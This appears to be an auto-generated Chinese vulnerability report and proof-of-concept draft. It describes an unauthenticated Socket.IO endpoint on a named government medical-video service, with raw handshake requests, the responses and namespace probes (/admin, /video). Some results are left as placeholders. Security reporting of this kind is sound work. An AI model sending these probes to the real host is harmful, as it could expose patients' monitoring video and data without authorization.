# POC/EXP — 4001 vitalSignVideoServer Socket.IO 完全无鉴权（视频流横向入口）

> 漏洞ID: `b3a58565-d564-4d5d-bed6-1dbb3fb6733c`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/socket.io/ + Socket.IO 业务事件`

**類型**: 鉴权绕过 / 信息泄露

## 描述

4001 vitalSignVideoServer Socket.IO 端点完全无鉴权：GET /socket.io/?EIO=4&transport=polling 无 token 直接返回 200 + SID f6LFotyK2pHEydrCABOX + set-cookie io=...; HttpOnly + access-control-allow-origin: *。与 4002 / 4004 同样的漏洞模式（express-jwt 未覆盖 SIO 层）。攻击者可建立匿名 Socket.IO 连接，作为视频流/医疗数据横向入口。vitalSignVideoServer 是处理视频流的关键服务，绕过鉴权可能导致患者视频监控数据泄露。

## 前置條件

无（无需任何凭证）

## POC / 復現步驟

```
步骤 1：根路径测试
GET / → 200 OK + Express 默认页（<title>Express</title> + "Welcome to Express"，170B）

步骤 2：Socket.IO 端点测试
GET /socket.io/?EIO=4&transport=polling
响应：
HTTP/1.1 200 OK
content-type: text/plain; charset=UTF-8
{"sid":"f6LFotyK2pHEydrCABOX","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":60000,"maxPayload":1000000}
set-cookie: io=f6LFotyK2pHEydrCABOX; HttpOnly
access-control-allow-origin: *

步骤 3：NS 变体测试
GET /socket.io/?EIO=4&transport=polling&ns=/admin → 200 OK + SID（待补全）
GET /socket.io/?EIO=4&transport=polling&ns=/video → 200 OK + SID（待补全）
（共 N 个 NS 变体全部接受 SID）

步骤 4：对比 4002 / 4004
- 4002 根 NS：express-jwt 配置错误（cookie/query token 任意值绕过）
- 4004 根 NS：完全无鉴权（直接返 SID）
- 4001 根 NS：完全无鉴权（直接返 SID）

三个 Socket.IO 服务（4001/4002/4004）均存在 Socket.IO 层鉴权缺失问题
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
